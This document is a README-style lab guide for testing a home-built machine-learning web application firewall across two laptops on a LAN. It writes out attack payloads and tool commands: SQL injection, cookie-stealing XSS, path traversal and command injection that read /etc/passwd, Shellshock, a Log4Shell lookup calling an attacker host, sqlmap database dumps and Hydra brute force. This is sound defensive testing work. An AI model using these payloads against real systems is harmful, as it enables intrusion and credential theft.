# ShadowGuard — LAN Attack Testing Guide



```
┌─────────────────────────┐        Ethernet Cable        ┌──────────────────────────────┐
│   Machine A (Defender)  │ ════════════════════════════ │   Machine B (Attacker)       │
│                         │                              │                              │
│  ┌─────────────────┐    │                              │  ┌────────────────────────┐  │
│  │  ShadowGuard    │    │                              │  │  Kali Linux VM         │  │
│  │  (WAF) :5000    │    │                              │  │  sqlmap, nikto, nmap   │  │
│  │  Nginx    :80   │    │                              │  │  burpsuite, hydra      │  │
│  │  TargetApp:8080 │    │                              │  └────────────────────────┘  │
│  └─────────────────┘    │                              │   ┌────────────────────────┐ │
│                         │                              │  │  Host OS                │ │
│  Static IP: 192.168.1.1 │                              │  │  lan_attack_test.py     │ │
└─────────────────────────┘                              │  Static IP: 192.168.1.2    │ │
                                                          └──────────────────────────────┘
```

**What each machine does:**
- **Machine A**: Runs Docker Compose (Nginx + ShadowGuard + TargetApp). This is the "production server."
- **Machine B (Host OS)**: Runs `lan_attack_test.py`, curl, and browser.
- **Machine B (Kali VM)**: Runs sqlmap, nikto, nmap, Burp Suite — the heavy attack tools.
  - Configure Kali VM to use **Bridged Adapter** networking so it shares the LAN cable IP range.

---

## Part 1 — Physical Connection

### Step 1: Connect the LAN Cable

Plug the Ethernet cable directly between the two laptops' RJ-45 ports.

> **Note**: Modern Ethernet ports (since ~2008) auto-negotiate crossover internally. A standard patch cable works fine — you do NOT need a crossover cable.

### Step 2: Disable WiFi on BOTH machines (important)

If WiFi is active, traffic might route through WiFi instead of the cable.

**On Machine A (Windows):**
```
Settings → Network & Internet → WiFi → Turn off
```
**On Machine A (Linux):**
```bash
sudo nmcli radio wifi off
# OR
sudo ip link set wlan0 down
```

### Step 3: Set Static IPs

You need static IPs so the attacker knows where to connect.

---

**Machine A — Defender (Windows 10/11):**

```
1. Press Win + R → "ncpa.cpl" → Enter
2. Right-click Ethernet adapter → Properties
3. Double-click "Internet Protocol Version 4 (TCP/IPv4)"
4. Select "Use the following IP address"
   IP address:     192.168.1.1
   Subnet mask:    255.255.255.0
   Default gateway: (leave blank)
5. Click OK → Close
```

**Machine A — Defender (Linux/Kali):**
```bash
# Find your ethernet interface name
ip link show
# Look for: eth0, enp3s0, eno1 etc.

# Set static IP
sudo ip addr add 192.168.1.1/24 dev eth0
sudo ip link set eth0 up

# Make it persistent (Ubuntu/Debian)
sudo nano /etc/netplan/01-netcfg.yaml
# Add:
# network:
#   version: 2
#   ethernets:
#     eth0:
#       addresses: [192.168.1.1/24]
sudo netplan apply
```

---

**Machine B — Attacker (Windows 10/11):**
```
IP address:    192.168.1.2
Subnet mask:   255.255.255.0
(Same steps as above)
```

**Machine B — Attacker (Linux):**
```bash
sudo ip addr add 192.168.1.2/24 dev eth0
sudo ip link set eth0 up
```

---

**Machine B — Kali VM (VirtualBox) — CRITICAL STEP:**

The Kali VM needs to see the LAN cable, not just the host OS.

```
1. In VirtualBox, select Kali VM → Settings
2. Network → Adapter 1
3. Attached to: Bridged Adapter
4. Name: Select your physical Ethernet adapter
   (NOT WiFi — the cable adapter, e.g. "Realtek PCIe GbE Family Controller")
5. Click OK
6. Start the VM
```

Inside Kali VM, set static IP:
```bash
sudo ip addr add 192.168.1.3/24 dev eth0
sudo ip link set eth0 up
# Now Kali has its own IP: 192.168.1.3
```

---

### Step 4: Verify Connectivity

**From Machine B, test that Machine A is reachable:**
```bash
ping 192.168.1.1
# Should see: Reply from 192.168.1.1, bytes=32, time<1ms

# If timeout: check firewall (see Troubleshooting at end)
```

**From Kali VM, test both machines:**
```bash
ping 192.168.1.1   # Machine A (WAF)
ping 192.168.1.2   # Machine B host
```

---

## Part 2 — Start the WAF Stack (Machine A)

### Step 1: Train the model (if not already done)

```bash
cd ~/shadowguard
source venv/bin/activate
python 01_prepare_dataset.py
python 02_train_model.py
```

### Step 2: Start with Docker Compose (recommended)

```bash
cd ~/shadowguard
docker-compose up --build

# Verify all three containers are running:
docker-compose ps
# NAME              STATUS    PORTS
# nginx             running   0.0.0.0:80->80/tcp
# shadowguard       running   5000/tcp (internal only)
# targetapp         running   8080/tcp (internal only)
```

### Step 3: Verify WAF is accessible

```bash
# From Machine A itself:
curl http://localhost/api/health
# Expected: {"status":"operational","ml_loaded":true,...}

# From Machine A, check target app is protected:
curl "http://localhost/search?q=test"
# Should return target app HTML (proxied through WAF)
```

### Step 4: Open Dashboard

From any browser on Machine A:
```
http://192.168.1.1/dashboard
Username: admin
Password: admin
```

Leave this open and visible — you will watch it update in real-time during attacks.

---

## Part 3 — Attack from Machine B (Host OS)

### Test 1 — Connectivity and Reachability

```bash
# Verify WAF is reachable from Machine B
curl http://192.168.1.1/api/health
curl http://192.168.1.1/

# Open in browser: http://192.168.1.1/demo
```

### Test 2 — Run the Automated Test Suite

```bash
pip install requests  # only needed once

# Full suite (all attack categories)
python lan_attack_test.py --target 192.168.1.1 --port 80 --mode full

# Individual categories
python lan_attack_test.py --target 192.168.1.1 --category sqli
python lan_attack_test.py --target 192.168.1.1 --category xss
python lan_attack_test.py --target 192.168.1.1 --category path
python lan_attack_test.py --target 192.168.1.1 --category cmd
python lan_attack_test.py --target 192.168.1.1 --category safe

# Verify safe requests pass through
python lan_attack_test.py --target 192.168.1.1 --category safe
# All should show: ALLOWED (HTTP 200) ✓ PASS
```

### Test 3 — Manual curl Attacks

```bash
WAF="http://192.168.1.1"

# SQLi — MUST be 403
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  "$WAF/search?q=' UNION SELECT username,password FROM users--"

# XSS — MUST be 403
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  "$WAF/search?q=<script>alert(document.cookie)</script>"

# Path Traversal — MUST be 403
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  "$WAF/file?path=../../etc/passwd"

# Command Injection — MUST be 403
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  "$WAF/ping?host=127.0.0.1; cat /etc/passwd"

# Shellshock — MUST be 403
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  -H "User-Agent: () { :; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd" \
  "$WAF/"

# Log4Shell — MUST be 403
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  "$WAF/search?q=\${jndi:ldap://192.168.1.2:1389/exploit}"

# Safe request — MUST be 200
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  "$WAF/search?q=laptop"

# Safe POST login — MUST be 200
curl -sv -o /dev/null -w "HTTP %{http_code}\n" \
  -X POST "$WAF/login" \
  -d "username=alice&password=password1"
```

### Test 4 — Rate Limiting and Blacklist

```bash
# Send 40 rapid requests to trigger rate limiting
for i in $(seq 1 40); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$WAF/search?q=test$i")
  echo "Request $i: HTTP $code"
done
# First 30: 200 (or 403 if they're attacks)
# Requests 31+: 429 Too Many Requests

# After 5 attacks from same IP → auto-banned
for i in $(seq 1 6); do
  curl -s -o /dev/null -w "Attack $i: HTTP %{http_code}\n" \
    "$WAF/search?q=' OR '1'='1"
done
# Last request should be 403 with "Banned IP" in response

# View current blacklist
curl http://192.168.1.1/api/blacklist

# Unban your own IP (for continued testing)
curl -X DELETE http://192.168.1.1/api/blacklist/192.168.1.2
```

---

## Part 4 — Attack from Kali VM (Machine B)

Make sure Kali VM is running with Bridged Adapter and IP 192.168.1.3.

### SQLMap — Automated SQL Injection Scanner

```bash
# First, demonstrate the target app IS vulnerable (bypass WAF directly)
sqlmap -u "http://192.168.1.1:8080/search?q=test" \
  --dbs --batch --level=2
# This WILL dump the database (target has no WAF at :8080)

# Now attack THROUGH the WAF
sqlmap -u "http://192.168.1.1/search?q=test" \
  --dbs --batch --level=3 --risk=2
# sqlmap should fail — WAF blocks all injection attempts
# You'll see: "all tested parameters do not appear to be injectable"

# Try with evasion techniques (WAF should still block)
sqlmap -u "http://192.168.1.1/search?q=test" \
  --dbs --batch --tamper=space2comment,between,randomcase \
  --level=3 --risk=2
# Tamper scripts try obfuscation — Tier 1 handles most variants
```

### Nikto — Web Vulnerability Scanner

```bash
nikto -h http://192.168.1.1 -port 80 -maxtime 120s -output nikto_report.txt
cat nikto_report.txt

# Watch the ShadowGuard dashboard — you'll see "Scanner Fingerprint" alerts
# Nikto's User-Agent is blocked by Tier 1 immediately
```

### Nmap — Port Scanner and Service Detection

```bash
# Port scan the WAF host
nmap -sV -sC -p 80,443,8080,5000 192.168.1.1

# From WAF's perspective: Nmap itself doesn't send HTTP payloads
# (HTTP probe requests would be caught, TCP SYN scans won't)
# This shows what's exposed: only port 80 via Nginx
```

### Burp Suite — Manual Attack Proxy

```bash
# Set up Burp:
# 1. Open Burp Suite → Proxy → Options
# 2. Proxy listener: 127.0.0.1:8080 (Burp itself, not target)
# 3. In browser: set HTTP proxy to 127.0.0.1:8080
# 4. Browse to http://192.168.1.1/

# In Burp:
# Proxy → HTTP History → Right-click any request → "Send to Repeater"
# Modify the request to include attack payloads
# Click Send and observe the WAF's 403 response
# Intercept tab shows the full request/response

# Burp Intruder (fuzzer):
# Mark the injection point: GET /search?q=§payload§ HTTP/1.1
# Load a SQL injection wordlist
# Start attack → watch how many get 403 vs 200
```

### Hydra — Brute Force Login

```bash
# Try brute-forcing the login endpoint
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid" \
  -t 4 -V

# Rate limiter will kick in after 30 req/10s
# After 5 failed-auth attacks, IP gets blacklisted
# Watch the dashboard for rate-limit and blacklist events
```

### OWASP ZAP — Automated Web App Scanner

```bash
# Run ZAP in Docker (easier than install)
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://192.168.1.1 -r zap_report.html
# ZAP's User-Agent and scanning patterns get caught at Tier 1
```

---

## Part 5 — Read the Dashboard

While attacks are running, keep the dashboard open at `http://192.168.1.1/dashboard`.

**What to look for:**

| Dashboard Element | What It Shows |
|---|---|
| Blocked counter going up | Each attack being caught |
| "Detection Tier" in logs | T1=Hard rule, T2=Soft score, T3=ML |
| Attack type breakdown | SQLi vs XSS vs Path vs CMD percentages |
| ML invoke rate | Should be low (~5-15%) — most caught by rules |
| Latency column | Rule blocks: 1-3ms · ML blocks: 10-20ms |
| Risk score bar | Red = high, yellow = medium, green = low |

**Check via API:**
```bash
# Live stats
curl http://192.168.1.1/api/stats | python3 -m json.tool

# Last 20 events
curl http://192.168.1.1/api/logs?n=20 | python3 -m json.tool

# ML engine stats (how often ML was actually needed)
curl http://192.168.1.1/api/model_stats | python3 -m json.tool
```

---

## Part 6 — Direct vs Protected Comparison

This is the most powerful demo moment. Show the SAME attack succeeding and failing.

```bash
# === ATTACK WITHOUT WAF (direct to :8080) ===
# SQL Injection succeeds — dumps database
sqlmap -u "http://192.168.1.1:8080/search?q=test" --dbs --batch
# Result: [INFO] fetching databases → admin, information_schema

# === ATTACK WITH WAF (through port 80) ===
sqlmap -u "http://192.168.1.1/search?q=test" --dbs --batch
# Result: all tested parameters are NOT injectable

# This is your proof of concept. Screenshot both.
```

---

## Part 7 — Capture Evidence for Portfolio

```bash
# Export the attack log as JSON (great for README/portfolio)
curl http://192.168.1.1/api/logs?n=100 \
  -H "Accept: application/json" \
  > evidence/attack_log_$(date +%Y%m%d).json

# Screenshot suggestions:
# 1. Dashboard showing 50+ blocked requests with attack types
# 2. sqlmap failing against the WAF (vs succeeding on :8080 directly)
# 3. Terminal output of lan_attack_test.py with 90%+ pass rate
# 4. API stats JSON showing block rate and tier breakdown
```

---

## Troubleshooting

**Ping fails between machines:**
```bash
# Machine A — disable Windows Firewall for private networks
# Settings → Windows Security → Firewall → Private networks → Off
# OR allow ICMP specifically:
netsh advfirewall firewall add rule name="Allow ICMP" \
  protocol=icmpv4:8,any dir=in action=allow

# Linux:
sudo ufw allow from 192.168.1.0/24
sudo ufw reload
```

**WAF returns 502 Bad Gateway:**
```bash
# Target app isn't running
docker-compose logs targetapp
# OR start it manually:
python target_app.py &
```

**Kali VM can't reach Machine A:**
```bash
# Check Kali's interface
ip addr show
# If no IP on eth0:
sudo ip addr add 192.168.1.3/24 dev eth0
sudo ip link set eth0 up

# Make sure VirtualBox Adapter is set to "Bridged"
# NOT NAT — NAT hides the VM behind the host
```

**sqlmap is not being blocked:**
```bash
# Make sure you're hitting port 80 (through WAF), not 8080 (direct)
# Also check dashboard — is the request even arriving?
curl http://192.168.1.1/api/stats
# If ml_loaded is false, model wasn't found — re-run 02_train_model.py
```

**Rate limiter blocks your own test traffic:**
```bash
# Add a delay between requests
python lan_attack_test.py --target 192.168.1.1 --delay 0.5

# Or unban your IP between test runs
curl -X DELETE http://192.168.1.1/api/blacklist/192.168.1.2
```
